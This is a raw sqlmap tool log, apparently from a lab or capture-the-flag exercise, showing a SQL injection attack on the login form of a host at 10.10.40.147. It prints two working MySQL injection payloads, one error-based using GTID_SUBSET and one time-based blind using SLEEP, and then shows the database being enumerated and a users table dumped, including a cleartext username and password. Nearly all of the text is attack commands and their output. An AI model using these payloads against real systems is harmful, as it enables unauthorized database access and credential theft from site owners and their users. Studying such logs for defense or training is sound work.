        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:29:41 /2023-09-29/

[20:29:41] [INFO] testing connection to the target URL
[20:29:41] [INFO] searching for forms
[1/1] Form:
POST http://10.10.40.147/administrator.php
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> Edit POST data [default: username=&password=] (Warning: blank fields detected): custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] [20:30:06] [INFO] resuming back-end DBMS 'mysql' 
[20:30:06] [INFO] using '/home/kali/.local/share/sqlmap/output/results-09292023_0830pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=' AND GTID_SUBSET(CONCAT(0x717a6a7671,(SELECT (ELT(9611=9611,1))),0x7178767a71),9611)-- hNGz&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=' AND (SELECT 5076 FROM (SELECT(SLEEP(5)))lHNZ)-- xNaA&password=
---
do you want to exploit this SQL injection? [Y/n] [20:30:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[20:30:27] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[20:30:27] [INFO] fetching current database
[20:30:27] [INFO] resumed: 'users'
[20:30:27] [INFO] fetching tables for database: 'users'
[20:30:28] [INFO] retrieved: 'users'
[20:30:28] [INFO] fetching columns for table 'users' in database 'users'
[20:30:28] [INFO] retrieved: 'username'
[20:30:28] [INFO] retrieved: 'varchar(100)'
[20:30:29] [INFO] retrieved: 'password'
[20:30:29] [INFO] retrieved: 'varchar(100)'
[20:30:29] [INFO] fetching entries for table 'users' in database 'users'
[20:30:29] [INFO] retrieved: 'secretpass'
[20:30:29] [INFO] retrieved: 'pingudad'
Database: users
Table: users
[1 entry]
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+

[20:30:29] [INFO] table 'users.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.40.147/dump/users/users.csv'
[20:30:29] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09292023_0830pm.csv'

[*] ending @ 20:30:29 /2023-09-29/

